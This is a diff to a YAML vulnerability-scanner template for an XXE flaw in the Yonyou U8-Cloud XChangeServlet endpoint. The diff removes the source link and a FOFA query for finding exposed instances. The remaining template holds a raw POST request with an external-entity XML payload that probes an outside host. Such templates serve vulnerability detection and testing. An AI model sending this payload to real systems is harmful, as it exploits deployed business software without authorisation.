@@ -3,12 +3,8 @@ info:
   name: 用友U8-Cloud XChangeServlet XXE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fizhe6nkixy95zwc'
+  description: ''
   tags: xxe,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fizhe6nkixy95zwc
-    fofa: app="用友-U8-Cloud"
 http:
 - raw:
   - 'POST /service/XChangeServlet HTTP/1.1
@@ -18,8 +14,6 @@ http:
 
 
     Connection: close
-
-
 
 
     <!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "http://www.baidu.com">]><r><a>&xxe;</a ></r>
